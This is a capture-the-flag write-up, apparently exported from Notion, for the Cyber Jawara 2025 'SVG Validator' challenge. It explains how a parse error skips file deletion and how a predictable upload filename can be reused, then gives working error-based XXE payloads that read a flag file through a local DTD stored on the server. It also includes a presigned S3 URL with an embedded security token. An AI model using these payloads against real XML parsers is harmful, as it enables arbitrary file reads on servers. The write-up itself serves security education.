---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4667ZVM5ZCJ%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T112618Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDMaCXVzLXdlc3QtMiJHMEUCIQCUc1XBx646TMSuE8HrNQyDJ3UzoxLsMB1h9yhqY08vEgIgOtFgXA2%2B8j6epaE7YSZZAejbIhnKcqGf9eCFVrtt5WMqiAQI7P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDkIkU0NQuZxOnKh8SrcA7LplXJu6aK3r7gPv%2BbAxMksuSP1ZqhUtZf3moOK9LcLS2Be9Ia0vcNnjPln70C1RHvx%2BcxFJeA%2FRsdQbNwPHZfaHSWZ%2BYHrgjjHnKwNRa%2F2E4TO1HMhRjQdf0nVdiWL8TB4v%2FE0OlOLKf20i1AP0lOK%2FOeSbx97TmYg5RANRykd3woMiAaw0dfS%2BL%2FJZ1rLO31M87HGBwRfPdfVBlyY8efT%2BwmgCOXD1Q1Tz7y8IF3xbGON9U5ehS%2BfYiHq%2BbnVBMxBJrr2uzIiHNXKcLtarrT5W%2BCfTLcoSfDEokDT3Phw5sY530jryAz47Oe8xzrK5nD6aHjXey8dRXEu3IOYmxwHqLKpxtEfhC2OlhIxmVZHf7Qmjhzag%2BtoxHLuhSIhxQhe1ozygg5hQYUeHWhWTg0Jj9n9MCvbFRKvg8WH4eIxo0MmY5WKCCG306WQBeXd29tEIDni75wl89zkwmZdSd%2FT5%2FOROgPbqT48dXh9i3V6%2F3fz4G6NZ5XHVD%2FBk73bBwlRlkbhUhQZbalYNqPaCqkOnZPi1u09Zi6Q2GwcixJVziHY0bB2FlmfM2mGMes5ihAU592V3csE2%2BZLoMZvpe2ba2NGrareS%2B99pZkfoekWh4QQWfLgS7l4AxmPMLKmwcEGOqUBEBUl2MTeNQ%2B%2B2Qc7sDej1ri772thpa015KUBmrloq3gWvRBe5mAUcoqWHRxmcAMSu%2FP4nmUadoPFVPS6CxkxlR9yOvs%2FnccjIgtU8T3Ny6KCS%2BlK3W1ksFvWrCktXhs%2FcF3UseAdCgmZPGKW%2BLSQP4T3B2h9Vj5%2BM17AqCcCM1XQUa05hUk%2Fu%2F%2F0qXXYunDslMsbUE3jgI9qBEJPhFlDeZVJg1X1\&X-Amz-Signature=5dfff718e4852634b9880d3d2e9ff332879649a787a72bb5bb9c9558e44b11be\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
